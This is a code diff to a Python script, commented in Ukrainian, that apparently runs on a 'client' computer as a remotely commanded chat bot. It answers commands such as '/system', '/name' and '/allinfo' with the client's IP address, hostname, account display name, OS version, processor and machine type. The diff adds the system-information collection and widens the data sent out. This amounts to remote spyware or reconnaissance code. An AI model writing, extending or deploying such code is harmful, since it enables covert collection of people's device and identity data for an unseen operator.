@@ -8,6 +8,9 @@ import sqlite3
 from datetime import datetime
 import socket
 import ctypes
+import platform
+
+my_system = platform.uname()
 
 n = socket.gethostname()
 
@@ -88,7 +91,7 @@ def get_display_name():
     GetUserNameEx(NameDisplay, nameBuffer, size)
     return nameBuffer.value
 
-un = get_display_name()
+d_n = get_display_name()
 
 def main():
     preview_text = Figlet(font='slant')
@@ -119,9 +122,20 @@ def main():
             elif get_message_text(upd).lower() == "/pc":
                 send_message(get_chat_id(upd),
                              f"Ім'я пристрою клієнта: {n}")
+            elif get_message_text(upd).lower() == "/system":
+                send_message(get_chat_id(upd),
+                             f"ОС: {my_system.system}")
+                send_message(get_chat_id(upd),
+                             f"Реліз ОС: {my_system.release}")
+                send_message(get_chat_id(upd),
+                             f"Версія: {my_system.version}")
+                send_message(get_chat_id(upd),
+                             f"Процессор: {my_system.processor}")
+                send_message(get_chat_id(upd),
+                             f"Машина: {my_system.machine}")
             elif get_message_text(upd).lower() == "/name":
                 send_message(get_chat_id(upd),
-                             f"Ім'я облікового запису клієнта: {un}")
+                             f"Ім'я облікового запису клієнта: {d_n}")
             elif get_message_text(upd).lower() == "/allinfo":
                 send_message(get_chat_id(upd),
                              f"IP клієнта: {a}")
@@ -130,7 +144,18 @@ def main():
                 send_message(get_chat_id(upd),
                              f"Ім'я пристрою клієнта: {n}")
                 send_message(get_chat_id(upd),
-                             f"Ім'я облікового запису клієнта: {un}")
+                             f"Ім'я облікового запису клієнта: {d_n}")
+                send_message(get_chat_id(upd),
+                             f"ОС: {my_system.system}")
+                send_message(get_chat_id(upd),
+                             f"Реліз ОС: {my_system.release}")
+                send_message(get_chat_id(upd),
+                             f"Версія: {my_system.version}")
+                send_message(get_chat_id(upd),
+                             f"Процессор: {my_system.processor}")
+                send_message(get_chat_id(upd),
+                             f"Машина: {my_system.machine}")
+
             else:
                 send_message(get_chat_id(upd), "Я не знаю що мені робить :(")
             up_id += 1
